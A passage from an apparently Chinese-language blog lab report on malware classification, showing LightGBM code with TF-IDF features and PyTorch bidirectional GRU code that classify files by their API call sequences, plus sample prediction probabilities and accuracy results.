&#125;).reset_index().rename(columns=&#123;&#x27;api&#x27;: &#x27;api_sequence&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">        print(&quot;准备API序列...&quot;)</span><br><span class="line">        train_sequences = prepare_api_sequence(train_data)</span><br><span class="line"></span><br><span class="line">        if self.tfidf is None:</span><br><span class="line">            print(&quot;训练TF-IDF向量化器...&quot;)</span><br><span class="line">            self.tfidf = TfidfVectorizer(</span><br><span class="line">                max_features=1000,</span><br><span class="line">                ngram_range=(1, 2),</span><br><span class="line">                min_df=5,</span><br><span class="line">                dtype=np.float32,</span><br><span class="line">                token_pattern=r&#x27;(?u)\b\w+\b&#x27;</span><br><span class="line">            )</span><br><span class="line">            tfidf_features = self.tfidf.fit_transform(train_sequences[&#x27;api_sequence&#x27;])</span><br><span class="line">        else:</span><br><span class="line">            tfidf_features = self.tfidf.transform(train_sequences[&#x27;api_sequence&#x27;])</span><br><span class="line"></span><br><span class="line">        feature_names = [f&#x27;tfidf_&#123;i&#125;&#x27; for i in range(tfidf_features.shape[1])]</span><br><span class="line">        tfidf_df = pd.DataFrame(</span><br><span class="line">            tfidf_features.toarray(),</span><br><span class="line">            columns=feature_names,</span><br><span class="line">            dtype=np.float32</span><br><span class="line">        )</span><br><span class="line">        tfidf_df[&#x27;file_id&#x27;] = train_sequences[&#x27;file_id&#x27;].values</span><br><span class="line"></span><br><span class="line">        if test_data is not None:</span><br><span class="line">            print(&quot;处理测试数据TF-IDF特征...&quot;)</span><br><span class="line">            test_sequences = prepare_api_sequence(test_data)</span><br><span class="line">            test_features = self.tfidf.transform(test_sequences[&#x27;api_sequence&#x27;])</span><br><span class="line">            test_tfidf_df = pd.DataFrame(</span><br><span class="line">                test_features.toarray(),</span><br><span class="line">                columns=feature_names,</span><br><span class="line">                dtype=np.float32</span><br><span class="line">            )</span><br><span class="line">            test_tfidf_df[&#x27;file_id&#x27;] = test_sequences[&#x27;file_id&#x27;].values</span><br><span class="line">            return tfidf_df, test_tfidf_df</span><br><span class="line"></span><br><span class="line">        return tfidf_df</span><br><span class="line"></span><br><span class="line">    def train(self, train_data, n_folds=5):</span><br><span class="line">        print(&quot;准备训练数据...&quot;)</span><br><span class="line">        train_features = self.prepare_features(train_data)</span><br><span class="line"></span><br><span class="line">        X = train_features.drop([&#x27;file_id&#x27;, &#x27;label&#x27;], axis=1)</span><br><span class="line">        y = train_features[&#x27;label&#x27;]</span><br><span class="line"></span><br><span class="line">        num_classes = len(y.unique())</span><br><span class="line"></span><br><span class="line">        params = &#123;</span><br><span class="line">            &#x27;objective&#x27;: &#x27;multiclass&#x27;,</span><br><span class="line">            &#x27;num_class&#x27;: num_classes,</span><br><span class="line">            &#x27;metric&#x27;: &#x27;multi_logloss&#x27;,</span><br><span class="line">            &#x27;boosting_type&#x27;: &#x27;gbdt&#x27;,</span><br><span class="line">            &#x27;num_leaves&#x27;: 31,</span><br><span class="line">            &#x27;learning_rate&#x27;: 0.05,</span><br><span class="line">            &#x27;feature_fraction&#x27;: 0.9,</span><br><span class="line">            &#x27;bagging_fraction&#x27;: 0.8,</span><br><span class="line">            &#x27;bagging_freq&#x27;: 5,</span><br><span class="line">            &#x27;verbose&#x27;: -1,</span><br><span class="line">            &#x27;max_bin&#x27;: 63,</span><br><span class="line">            &#x27;min_data_in_leaf&#x27;: 50,</span><br><span class="line">            &#x27;num_threads&#x27;: 8</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if self.use_gpu:</span><br><span class="line">            gpu_params = &#123;</span><br><span class="line">                &#x27;device&#x27;: &#x27;gpu&#x27;,</span><br><span class="line">                &#x27;gpu_platform_id&#x27;: 0,</span><br><span class="line">                &#x27;gpu_device_id&#x27;: 0,</span><br><span class="line">                &#x27;device_type&#x27;: &#x27;cuda&#x27;,</span><br><span class="line">                &#x27;tree_learner&#x27;: &#x27;feature&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            params.update(gpu_params)</span><br><span class="line"></span><br><span class="line">        kf = StratifiedKFold(n_splits=n_folds, shuffle=True, random_state=42)</span><br><span class="line">        self.models = []</span><br><span class="line">        self.feature_importances = pd.DataFrame()</span><br><span class="line">        validation_accuracies = []</span><br><span class="line"></span><br><span class="line">        print(f&quot;开始&#123;n_folds&#125;折交叉验证训练...&quot;)</span><br><span class="line">        for fold, (train_idx, val_idx) in enumerate(kf.split(X, y), 1):</span><br><span class="line">            print(f&quot;\n训练折数 &#123;fold&#125;/&#123;n_folds&#125;&quot;)</span><br><span class="line">            X_train, X_val = X.iloc[train_idx], X.iloc[val_idx]</span><br><span class="line">            y_train, y_val = y.iloc[train_idx], y.iloc[val_idx]</span><br><span class="line"></span><br><span class="line">            train_data = lgb.Dataset(X_train, y_train)</span><br><span class="line">            valid_data = lgb.Dataset(X_val, y_val, reference=train_data)</span><br><span class="line"></span><br><span class="line">            model = lgb.train(</span><br><span class="line">                params,</span><br><span class="line">                train_data,</span><br><span class="line">                num_boost_round=1000,</span><br><span class="line">                valid_sets=[valid_data],</span><br><span class="line">                callbacks=[</span><br><span class="line">                    lgb.early_stopping(50),</span><br><span class="line">                    lgb.log_evaluation(100)</span><br><span class="line">                ]</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            self.models.append(model)</span><br><span class="line"></span><br><span class="line">            fold_importance = pd.DataFrame(&#123;</span><br><span class="line">                &#x27;feature&#x27;: X.columns,</span><br><span class="line">                f&#x27;importance_fold_&#123;fold&#125;&#x27;: model.feature_importance()</span><br><span class="line">            &#125;)</span><br><span class="line">            self.feature_importances = pd.concat([</span><br><span class="line">                self.feature_importances,</span><br><span class="line">                fold_importance</span><br><span class="line">            ], axis=1)</span><br><span class="line"></span><br><span class="line">            val_preds = model.predict(X_val)</span><br><span class="line">            val_preds = np.argmax(val_preds, axis=1)</span><br><span class="line">            val_accuracy = accuracy_score(y_val, val_preds)</span><br><span class="line">            validation_accuracies.append(val_accuracy)</span><br><span class="line">            print(f&quot;Fold &#123;fold&#125; 验证集准确率: &#123;val_accuracy:.4f&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        mean_accuracy = np.mean(validation_accuracies)</span><br><span class="line">        print(f&quot;\n平均验证集准确率: &#123;mean_accuracy:.4f&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    def predict(self, test_data):</span><br><span class="line">        print(&quot;准备测试数据...&quot;)</span><br><span class="line">        test_features = self.prepare_features(test_data=test_data)</span><br><span class="line"></span><br><span class="line">        print(&quot;生成预测...&quot;)</span><br><span class="line">        X_test = test_features.drop([&#x27;file_id&#x27;], axis=1)</span><br><span class="line"></span><br><span class="line">        predictions = np.zeros((len(X_test), len(self.label_map)), dtype=np.float32)</span><br><span class="line">        for model in self.models:</span><br><span class="line">            predictions += model.predict(X_test)</span><br><span class="line">        predictions /= len(self.models)</span><br><span class="line"></span><br><span class="line">        submission = pd.DataFrame(&#123;</span><br><span class="line">            &#x27;file_id&#x27;: test_features[&#x27;file_id&#x27;]</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        for i, label in enumerate(sorted(self.label_map.keys())):</span><br><span class="line">            submission[f&#x27;prob_&#123;label&#125;&#x27;] = predictions[:, i]</span><br><span class="line"></span><br><span class="line">        return submission</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def load_data_in_chunks(train_path, test_path, chunk_size=1000000):</span><br><span class="line">    print(&quot;读取训练数据...&quot;)</span><br><span class="line">    train_chunks = pd.read_csv(train_path, chunksize=chunk_size)</span><br><span class="line">    train_data = pd.concat(train_chunks)</span><br><span class="line"></span><br><span class="line">    print(&quot;读取测试数据...&quot;)</span><br><span class="line">    test_chunks = pd.read_csv(test_path, chunksize=chunk_size)</span><br><span class="line">    test_data = pd.concat(test_chunks)</span><br><span class="line"></span><br><span class="line">    train_data = optimize_dtypes(train_data)</span><br><span class="line">    test_data = optimize_dtypes(test_data)</span><br><span class="line"></span><br><span class="line">    print(f&quot;训练数据形状: &#123;train_data.shape&#125;&quot;)</span><br><span class="line">    print(f&quot;测试数据形状: &#123;test_data.shape&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    return train_data, test_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;检查GPU状态...&quot;)</span><br><span class="line">    gpu_available = check_gpu()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        train_data, test_data = load_data_in_chunks(</span><br><span class="line">            &#x27;input/train.csv&#x27;,</span><br><span class="line">            &#x27;input/test.csv&#x27;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        classifier = MalwareClassifier(use_gpu=gpu_available)</span><br><span class="line"></span><br><span class="line">        classifier.train(train_data, n_folds=5)</span><br><span class="line"></span><br><span class="line">        print(&quot;生成预测结果...&quot;)</span><br><span class="line">        submission = classifier.predict(test_data)</span><br><span class="line"></span><br><span class="line">        print(&quot;保存预测结果...&quot;)</span><br><span class="line">        submission.to_csv(&#x27;submission.csv&#x27;, index=False)</span><br><span class="line"></span><br><span class="line">        if classifier.feature_importances is not None:</span><br><span class="line">            classifier.feature_importances.to_csv(&#x27;feature_importances.csv&#x27;, index=False)</span><br><span class="line"></span><br><span class="line">        print(&quot;完成!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;发生错误: &#123;str(e)&#125;&quot;)</span><br><span class="line">        import traceback</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li>结果展示</li>
</ol>
<img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213004238784.png" class="" title="image-20241213004238784">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">file_id,prob_0,prob_1,prob_2,prob_3,prob_4,prob_5,prob_6,prob_7</span><br><span class="line">1,0.0024434612,0.00034864913,0.9696685,0.0078575,0.00039957318,0.002738173,0.0044820085,0.012062186</span><br><span class="line">2,0.7480677,0.0013819844,0.0049213427,0.003764731,0.0005452622,0.045439627,0.017060611,0.17881876</span><br><span class="line">3,0.99866915,2.787807e-05,0.00014846055,0.00011570427,5.9706535e-06,0.00043032583,6.843034e-05,0.00053410063</span><br><span class="line">4,0.051594943,0.0038525928,0.035013992,0.065091416,0.0038617428,0.044863444,0.22614911,0.5695728</span><br><span class="line">5,0.9948373,0.00013502031,0.0009673423,0.0006626427,2.3118486e-05,0.0015179071,0.00018578261,0.0016709866</span><br><span class="line">6,0.002266401,0.00025418383,0.006541302,0.0007698187,3.052294e-05,0.98704815,0.00070866174,0.0023810265</span><br><span class="line">7,0.0043757814,0.00055977836,0.0015399179,0.70781934,0.002132857,0.025764057,0.0015818799,0.2562264</span><br><span class="line">8,0.93392134,0.0009572902,0.0076661445,0.0061014136,0.00012724655,0.016519673,0.003812942,0.030893898</span><br><span class="line">9,0.85189515,0.0010084683,0.0036384996,0.0051778518,0.00022519422,0.07421501,0.014758055,0.04908181</span><br><span class="line">10,0.37684268,0.006323976,0.20794848,0.0114947595,0.00050486217,0.12723994,0.03782148,0.23182385</span><br><span class="line">11,0.0064604813,0.0006989088,0.0032121348,0.0008223769,5.8260433e-05,0.9772016,0.0031507823,0.008395462</span><br><span class="line">12,0.9656893,0.0048273774,0.009747942,0.001571597,4.1226842e-05,0.0074556046,0.000666464,0.010000597</span><br><span class="line">13,0.9976041,5.375104e-05,0.00030956598,0.00024548933,1.8375762e-05,0.0011245721,9.734804e-05,0.00054680154</span><br><span class="line">14,0.9703827,0.00031270864,0.01056415,0.008323639,0.00010526275,0.0041897697,0.00083469774,0.0052871224</span><br><span class="line">15,0.9724293,0.0001765955,0.020143056,0.0005281937,5.2647345e-05,0.0018647272,0.00078569603,0.004019852</span><br><span class="line">16,0.99562645,7.9901416e-05,0.00037493333,0.00046305108,1.6109376e-05,0.0015119539,0.00081107346,0.0011165042</span><br><span class="line">17,0.001069112,0.00026497667,0.004910701,0.0060763317,0.00013840488,0.96927947,0.0017614173,0.016499612</span><br><span class="line">18,0.986684,0.00047525796,0.0021059073,0.0008186839,3.3282307e-05,0.004973329,0.0010258693,0.0038835872</span><br><span class="line">19,0.9890321,0.00015959739,0.002707534,0.0009250467,5.465704e-05,0.0030247762,0.00037867084,0.0037176465</span><br></pre></td></tr></table></figure>
.png)

#### 第三部分：基于深度学习的恶意程序检测与分类

##### **实验方法**

1. 特征：
   - 使用API调用序列直接作为输入。
2. 模型结构：
   - 基于双向GRU的深度学习模型。
   - 嵌入层将API序列转换为向量，双向GRU捕获序列时序信息，全连接层输出分类结果。
3. 训练与验证：
   - 使用交叉熵损失函数，Adam优化器。
   - 保存验证集损失最小的模型。

##### **实验结果**

1. 代码实现：

   - 使用PyTorch实现深度学习模型。

2. 性能表现：

   - 最终验证集准确率达到**83.66%**。
   - 模型在20个epoch中逐步收敛，训练准确率从初始的42.72%提升至84.67%。
   - 验证集损失显著降低，证明模型具有良好的泛化能力。

   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line">import torch</span><br><span class="line">import torch.nn as nn</span><br><span class="line">import torch.optim as optim</span><br><span class="line">from torch.utils.data import DataLoader, Dataset</span><br><span class="line">from sklearn.preprocessing import LabelEncoder</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line"># 设置随机种子和设备</span><br><span class="line">SEED = 42</span><br><span class="line">np.random.seed(SEED)</span><br><span class="line">torch.manual_seed(SEED)</span><br><span class="line">DEVICE = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;)</span><br><span class="line">print(f&quot;Using device: &#123;DEVICE&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 加载数据</span><br><span class="line">train_data = pd.read_csv(&#x27;input/train.csv&#x27;)</span><br><span class="line">test_data = pd.read_csv(&#x27;input/test.csv&#x27;)</span><br><span class="line"></span><br><span class="line"># 编码API</span><br><span class="line">apis = list(set(list(train_data.api.unique()) + list(test_data.api.unique())))</span><br><span class="line">enc = LabelEncoder().fit(apis)</span><br><span class="line">train_data[&#x27;enc&#x27;] = enc.transform(train_data.api)</span><br><span class="line">test_data[&#x27;enc&#x27;] = enc.transform(test_data.api)</span><br><span class="line"></span><br><span class="line"># 聚合每个文件的API序列</span><br><span class="line">tr = train_data.groupby(&#x27;file_id&#x27;).enc.apply(list).reset_index()</span><br><span class="line">te = test_data.groupby(&#x27;file_id&#x27;).enc.apply(list).reset_index()</span><br><span class="line"></span><br><span class="line"># 提取标签</span><br><span class="line">label = train_data.groupby(&#x27;file_id&#x27;)[&#x27;label&#x27;].agg(&#x27;first&#x27;).reset_index()</span><br><span class="line">num_classes = label.label.nunique()</span><br><span class="line">label_encoder = LabelEncoder()</span><br><span class="line">label[&#x27;label&#x27;] = label_encoder.fit_transform(label[&#x27;label&#x27;])</span><br><span class="line"></span><br><span class="line"># 填充序列</span><br><span class="line">MAX_SEQ_LEN = 5000</span><br><span class="line">tr[&#x27;enc&#x27;] = tr[&#x27;enc&#x27;].apply(lambda x: x[:MAX_SEQ_LEN] if len(x) &gt; MAX_SEQ_LEN else x + [0] * (MAX_SEQ_LEN - len(x)))</span><br><span class="line">te[&#x27;enc&#x27;] = te[&#x27;enc&#x27;].apply(lambda x: x[:MAX_SEQ_LEN] if len(x) &gt; MAX_SEQ_LEN else x + [0] * (MAX_SEQ_LEN - len(x)))</span><br><span class="line"></span><br><span class="line"># 转换为 PyTorch Dataset</span><br><span class="line">class VirusDataset(Dataset):</span><br><span class="line">    def __init__(self, sequences, labels=None):</span><br><span class="line">        self.sequences = torch.tensor(sequences, dtype=torch.long)</span><br><span class="line">        self.labels = torch.tensor(labels, dtype=torch.long) if labels is not None else None</span><br><span class="line"></span><br><span class="line">    def __len__(self):</span><br><span class="line">        return len(self.sequences)</span><br><span class="line"></span><br><span class="line">    def __getitem__(self, idx):</span><br><span class="line">        if self.labels is not None:</span><br><span class="line">            return self.sequences[idx], self.labels[idx]</span><br><span class="line">        else:</span><br><span class="line">            return self.sequences[idx]</span><br><span class="line"></span><br><span class="line"># 创建数据集</span><br><span class="line">X_train, X_val, y_train, y_val = train_test_split(tr[&#x27;enc&#x27;].tolist(), label[&#x27;label&#x27;].tolist(), test_size=0.2, random_state=SEED)</span><br><span class="line">train_dataset = VirusDataset(X_train, y_train)</span><br><span class="line">val_dataset = VirusDataset(X_val, y_val)</span><br><span class="line">test_dataset = VirusDataset(te[&#x27;enc&#x27;].tolist())</span><br><span class="line"></span><br><span class="line"># 数据加载器</span><br><span class="line">BATCH_SIZE = 256</span><br><span class="line">train_loader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)</span><br><span class="line">val_loader = DataLoader(val_dataset, batch_size=BATCH_SIZE, shuffle=False)</span><br><span class="line">test_loader = DataLoader(test_dataset, batch_size=BATCH_SIZE, shuffle=False)</span><br><span class="line"></span><br><span class="line"># 模型定义</span><br><span class="line">class GRUModel(nn.Module):</span><br><span class="line">    def __init__(self, vocab_size, embed_dim, hidden_dim, num_classes):</span><br><span class="line">        super(GRUModel, self).__init__()</span><br><span class="line">        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)</span><br><span class="line">        self.gru = nn.GRU(embed_dim, hidden_dim, batch_first=True, bidirectional=True)</span><br><span class="line">        self.fc = nn.Linear(hidden_dim * 2, num_classes)</span><br><span class="line">        self.dropout = nn.Dropout(0.3)</span><br><span class="line"></span><br><span class="line">    def forward(self, x):</span><br><span class="line">        x = self.embedding(x)  # x shape: (batch_size, seq_len, embed_dim)</span><br><span class="line">        x, _ = self.gru(x)     # x shape: (batch_size, seq_len, hidden_dim * 2)</span><br><span class="line">        x = x[:, -1, :]         # 取最后一个时间步的输出 (batch_size, hidden_dim * 2)</span><br><span class="line">        x = self.dropout(x)</span><br><span class="line">        x = self.fc(x)         # x shape: (batch_size, num_classes)</span><br><span class="line">        return x</span><br><span class="line"></span><br><span class="line"># 超参数</span><br><span class="line">VOCAB_SIZE = len(apis) + 1</span><br><span class="line">EMBED_DIM = 50</span><br><span class="line">HIDDEN_DIM = 128</span><br><span class="line">NUM_CLASSES = num_classes</span><br><span class="line">LR = 0.001</span><br><span class="line">EPOCHS = 20</span><br><span class="line"></span><br><span class="line"># 初始化模型、损失函数和优化器</span><br><span class="line">model = GRUModel(VOCAB_SIZE, EMBED_DIM, HIDDEN_DIM, NUM_CLASSES).to(DEVICE)</span><br><span class="line">criterion = nn.CrossEntropyLoss()</span><br><span class="line">optimizer = optim.Adam(model.parameters(), lr=LR)</span><br><span class="line"></span><br><span class="line"># 检查是否存在模型文件</span><br><span class="line">MODEL_PATH = &#x27;best_gru_model.pth&#x27;</span><br><span class="line">if os.path.exists(MODEL_PATH):</span><br><span class="line">    print(f&quot;检测到已有模型文件 &#123;MODEL_PATH&#125;，直接加载模型进行预测...&quot;)</span><br><span class="line">    model.load_state_dict(torch.load(MODEL_PATH))</span><br><span class="line">else:</span><br><span class="line">    # 训练和验证函数</span><br><span class="line">    def train_epoch(model, dataloader, criterion, optimizer):</span><br><span class="line">        model.train()</span><br><span class="line">        epoch_loss, correct, total = 0, 0, 0</span><br><span class="line">        for sequences, labels in tqdm(dataloader, desc=&quot;Training&quot;):</span><br><span class="line">            sequences, labels = sequences.to(DEVICE), labels.to(DEVICE)</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            outputs = model(sequences)</span><br><span class="line">            loss = criterion(outputs, labels)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            epoch_loss += loss.item() * sequences.size(0)</span><br><span class="line">            preds = outputs.argmax(dim=1)</span><br><span class="line">            correct += (preds == labels).sum().item()</span><br><span class="line">            total += labels.size(0)</span><br><span class="line">        return epoch_loss / total, correct / total</span><br><span class="line"></span><br><span class="line">    def validate_epoch(model, dataloader, criterion):</span><br><span class="line">        model.eval()</span><br><span class="line">        epoch_loss, correct, total = 0, 0, 0</span><br><span class="line">        with torch.no_grad():</span><br><span class="line">            for sequences, labels in tqdm(dataloader, desc=&quot;Validation&quot;):</span><br><span class="line">                sequences, labels = sequences.to(DEVICE), labels.to(DEVICE)</span><br><span class="line">                outputs = model(sequences)</span><br><span class="line">                loss = criterion(outputs, labels)</span><br><span class="line">                epoch_loss += loss.item() * sequences.size(0)</span><br><span class="line">                preds = outputs.argmax(dim=1)</span><br><span class="line">                correct += (preds == labels).sum().item()</span><br><span class="line">                total += labels.size(0)</span><br><span class="line">        return epoch_loss / total, correct / total</span><br><span class="line"></span><br><span class="line">    # 开始训练模型</span><br><span class="line">    best_val_loss = float(&#x27;inf&#x27;)</span><br><span class="line">    for epoch in range(EPOCHS):</span><br><span class="line">        print(f&quot;\nEpoch &#123;epoch + 1&#125;/&#123;EPOCHS&#125;&quot;)</span><br><span class="line">        train_loss, train_acc = train_epoch(model, train_loader, criterion, optimizer)</span><br><span class="line">        val_loss, val_acc = validate_epoch(model, val_loader, criterion)</span><br><span class="line">        print(f&quot;Train Loss: &#123;train_loss:.4f&#125;, Train Accuracy: &#123;train_acc:.4f&#125;&quot;)</span><br><span class="line">        print(f&quot;Validation Loss: &#123;val_loss:.4f&#125;, Validation Accuracy: &#123;val_acc:.4f&#125;&quot;)</span><br><span class="line">        if val_loss &lt; best_val_loss:</span><br><span class="line">            best_val_loss = val_loss</span><br><span class="line">            torch.save(model.state_dict(), MODEL_PATH)</span><br><span class="line">            print(f&quot;Model saved at &#123;MODEL_PATH&#125;!&quot;)</span><br><span class="line"></span><br><span class="line"># 测试集预测</span><br><span class="line">model.eval()</span><br><span class="line">test_preds = []</span><br><span class="line">with torch.no_grad():</span><br><span class="line">    for sequences in tqdm(test_loader, desc=&quot;Testing&quot;):</span><br><span class="line">        sequences = sequences.to(DEVICE)</span><br><span class="line">        outputs = model(sequences)</span><br><span class="line">        preds = torch.softmax(outputs, dim=1).cpu().numpy()</span><br><span class="line">        test_preds.append(preds)</span><br><span class="line"></span><br><span class="line">test_preds = np.concatenate(test_preds, axis=0)</span><br><span class="line"></span><br><span class="line"># 创建提交文件</span><br><span class="line">sub = pd.DataFrame()</span><br><span class="line">sub[&#x27;file_id&#x27;] = te[&#x27;file_id&#x27;]  # 使用测试集中的 file_id 列</span><br><span class="line"></span><br><span class="line"># 将每个类别的预测概率填入</span><br><span class="line">for i in range(NUM_CLASSES):</span><br><span class="line">    sub[f&#x27;prob&#123;i&#125;&#x27;] = test_preds[:, i]</span><br><span class="line"></span><br><span class="line"># 保存为提交文件</span><br><span class="line">sub.to_csv(&#x27;pytorch_gru_submission.csv&#x27;, index=False)</span><br><span class="line">print(&quot;预测完成并保存至 pytorch_gru_submission.csv&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 